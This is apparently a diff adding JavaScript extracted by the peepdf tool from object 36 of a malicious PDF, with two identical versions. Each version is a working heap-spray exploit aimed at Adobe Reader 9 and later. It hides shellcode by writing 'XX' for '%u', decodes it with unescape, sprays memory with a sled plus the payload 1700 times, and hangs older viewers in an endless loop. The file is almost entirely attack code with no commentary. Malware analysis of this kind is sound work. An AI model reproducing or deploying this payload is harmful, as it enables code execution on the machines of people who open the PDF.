@@ -1,0 +1,58 @@
+// peepdf comment: Javascript code located in object 36 (version 1)
+
+function urpl(sc) {
+    var keyu = "%u";
+    var re = /XX/g;
+    sc = sc.replace(re, keyu);
+    return sc;
+}
+
+function xxsc(sc) {
+    var sprdataxx = "XX1010XX1010";
+    var esprpl = unescape;
+    var urpled = esprpl(urpl(sc));
+    var blknum = 0x41000;
+    var sprdata = esprpl(urpl(sprdataxx));
+
+    while (sprdata.length < blknum)
+    sprdata += sprdata;
+    sprblk = sprdata.substring(0, sprdata.length);
+    scblk = urpled.substring(0, urpled.length);
+    memory = new Array();
+    for (x = 0; x < 1700; x++)
+    memory[x] = sprblk + scblk;
+}
+var s = "XXc933XXb966XX0184XX0debXX565eXX068aXXc132XX0688XX4946XXf675XXe8c3XXffeeXXffffXX08d1XX026eXX236cXX2b2dXXbc2bXX893fXX776bXX7576XX6d9dXX7173XXe070XX912bXXca08XX695aXX6768XX25edXXe868XX7d12XXd4cdXX5506XX06d5XXd2b6XXa715XX28ddXX02a8XX14d9XXc4bcXX713eXX3fc7XX314cXXb74bXXce10XX6332XXb141XXf673XX7c77XX3891XXd57fXXec0bXX8b39XX0924XX45e4XXee38XX20e5XXf12fXXc26aXX1cd9XX5039XX7dc2XX7fa9XX1c04XXf143XX907aXX5216XX4993XX160aXXff49XX1599XX0c9bXXe14bXX52a7XXbce8XXc73bXX408fXX8aecXXe547XXba83XXf91aXXfb96XXbc71XXa71cXXb87dXX0c08XXe9a3XXaa79XX6e1aXX1f91XX9d15XX6685XX119bXXc3e4XXe1e2XXdd9dXXbf35XX9bb6XXd9b2XXd7c8XX5ed6XX2781XXbb80XX44d0XX318bXX9b33XX40f6XX3f8dXXc5acXXc3aeXXc1a8XXf24bXXec5aXXee37XX4646XX83eaXXb5dcXXf639XXe15aXXe23bXXfc5aXXfe27XXfb52XXe223XXf542XXee2fXX5e5eXXaff1XXc815XX9864XX6dcfXXed19XXf06aXXf5fbXXe498XX6492XXe5aeXX0b8cXX898aXXc203XXd572XXce0fXXd07aXX2a0bXX8282XX3b2eXX78c2XX7778XXf076XX7cb4XX1cf7XX908fXXe691XX9319XXa059XXe629XX6b5aXX0c01XX6b04XXa915XX9cddXX5858XXa6abXXab2dXX20a9XXacb0XXb984XXb18dXXb2b1XXdcb7XX46b7XXce16XXdcaaXX54e1XX3d42XXc132XX2b8dXX2cdaXX42b5XX4448XX03d9XXa899XXee4fXX4246XX689eXX0914XXce86XXed1bXX7eacXX6daaXXcd2cXX88daXX511cXX7e0aXX09e0XX1fb4XX63ccXXaa97XX69a7XXc544XX9ca1XX38a0XX0a0cXXf990XX0b8cXX7a1bXXe908";
+var a = app.viewerVersion;
+if (a >= 9) xxsc(s);
+else while (1) {};
+
+// peepdf comment: Javascript code located in object 36 (version 2)
+
+function urpl(sc) {
+    var keyu = "%u";
+    var re = /XX/g;
+    sc = sc.replace(re, keyu);
+    return sc;
+}
+
+function xxsc(sc) {
+    var sprdataxx = "XX1010XX1010";
+    var esprpl = unescape;
+    var urpled = esprpl(urpl(sc));
+    var blknum = 0x41000;
+    var sprdata = esprpl(urpl(sprdataxx));
+
+    while (sprdata.length < blknum)
+    sprdata += sprdata;
+    sprblk = sprdata.substring(0, sprdata.length);
+    scblk = urpled.substring(0, urpled.length);
+    memory = new Array();
+    for (x = 0; x < 1700; x++)
+    memory[x] = sprblk + scblk;
+}
+var s = "XXc933XXb966XX0184XX0debXX565eXX068aXXc132XX0688XX4946XXf675XXe8c3XXffeeXXffffXX08d1XX026eXX236cXX2b2dXXbc2bXX893fXX776bXX7576XX6d9dXX7173XXe070XX912bXXca08XX695aXX6768XX25edXXe868XX7d12XXd4cdXX5506XX06d5XXd2b6XXa715XX28ddXX02a8XX14d9XXc4bcXX713eXX3fc7XX314cXXb74bXXce10XX6332XXb141XXf673XX7c77XX3891XXd57fXXec0bXX8b39XX0924XX45e4XXee38XX20e5XXf12fXXc26aXX1cd9XX5039XX7dc2XX7fa9XX1c04XXf143XX907aXX5216XX4993XX160aXXff49XX1599XX0c9bXXe14bXX52a7XXbce8XXc73bXX408fXX8aecXXe547XXba83XXf91aXXfb96XXbc71XXa71cXXb87dXX0c08XXe9a3XXaa79XX6e1aXX1f91XX9d15XX6685XX119bXXc3e4XXe1e2XXdd9dXXbf35XX9bb6XXd9b2XXd7c8XX5ed6XX2781XXbb80XX44d0XX318bXX9b33XX40f6XX3f8dXXc5acXXc3aeXXc1a8XXf24bXXec5aXXee37XX4646XX83eaXXb5dcXXf639XXe15aXXe23bXXfc5aXXfe27XXfb52XXe223XXf542XXee2fXX5e5eXXaff1XXc815XX9864XX6dcfXXed19XXf06aXXf5fbXXe498XX6492XXe5aeXX0b8cXX898aXXc203XXd572XXce0fXXd07aXX2a0bXX8282XX3b2eXX78c2XX7778XXf076XX7cb4XX1cf7XX908fXXe691XX9319XXa059XXe629XX6b5aXX0c01XX6b04XXa915XX9cddXX5858XXa6abXXab2dXX20a9XXacb0XXb984XXb18dXXb2b1XXdcb7XX46b7XXce16XXdcaaXX54e1XX3d42XXc132XX2b8dXX2cdaXX42b5XX4448XX03d9XXa899XXee4fXX4246XX689eXX0914XXce86XXed1bXX7eacXX6daaXXcd2cXX88daXX511cXX7e0aXX09e0XX1fb4XX63ccXXaa97XX69a7XXc544XX9ca1XX38a0XX0a0cXXf990XX0b8cXX7a1bXXe908";
+var a = app.viewerVersion;
+if (a >= 9) xxsc(s);
+else while (1) {};
+
